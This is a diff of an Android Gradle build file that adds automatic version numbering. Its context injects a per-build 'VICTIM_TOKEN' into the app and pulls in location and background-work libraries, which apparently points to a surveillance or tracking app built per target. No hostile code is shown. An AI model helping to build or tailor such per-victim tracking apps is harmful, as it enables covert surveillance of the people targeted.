@@ -2,6 +2,39 @@ plugins {
     id 'com.android.application'
 }
 
+// ============================================
+// Auto-increment version code
+// ============================================
+def getVersionCode() {
+    // لو فيه ENV → استخدمه (من GitHub Actions)
+    if (System.getenv("BUILD_NUMBER")) {
+        try {
+            return Integer.parseInt(System.getenv("BUILD_NUMBER"))
+        } catch (Exception e) {}
+    }
+    
+    // وإلا زوّد 1 عن آخر مرة
+    def versionFile = file('../version.properties')
+    if (versionFile.exists()) {
+        def props = new Properties()
+        versionFile.withInputStream { props.load(it) }
+        def code = (props.getProperty('VERSION_CODE') ?: '1') as Integer
+        code += 1
+        return code
+    }
+    return 1
+}
+
+def getVersionName() {
+    def versionFile = file('../version.properties')
+    if (versionFile.exists()) {
+        def props = new Properties()
+        versionFile.withInputStream { props.load(it) }
+        return props.getProperty('VERSION_NAME') ?: '1.0.0'
+    }
+    return '1.0.0'
+}
+
 def victimTokenValue = "DEFAULT_TOKEN"
 if (project.hasProperty('victimToken')) {
     victimTokenValue = project.property('victimToken')
@@ -11,6 +44,8 @@ if (System.getenv("VICTIM_TOKEN")) {
 }
 
 println "BUILDING WITH VICTIM_TOKEN = ${victimTokenValue}"
+println "VERSION CODE = ${getVersionCode()}"
+println "VERSION NAME = ${getVersionName()}"
 
 android {
     namespace 'com.sec.check'
@@ -20,8 +55,8 @@ android {
         applicationId "com.sec.check"
         minSdk 23
         targetSdk 33
-        versionCode 1
-        versionName "1.0"
+        versionCode getVersionCode()      // ← تلقائي
+        versionName getVersionName()      // ← تلقائي
         buildConfigField "String", "VICTIM_TOKEN", "\"${victimTokenValue}\""
     }
 
@@ -57,20 +92,7 @@ dependencies {
     implementation 'androidx.appcompat:appcompat:1.6.1'
     implementation 'androidx.core:core:1.10.1'
     implementation 'androidx.work:work-runtime:2.8.1'
-
-    // ★ JobScheduler
-    implementation 'androidx.core:core:1.10.1'
-
-    // ★ Account Manager
     implementation 'androidx.preference:preference:1.2.0'
-
-    // ★★★ Google Play Services - Location (جديد) ★★★
     implementation 'com.google.android.gms:play-services-location:21.0.1'
-
-    implementation('androidx.appcompat:appcompat:1.6.1') {
-        exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
-        exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
-    }
-
     implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
 }
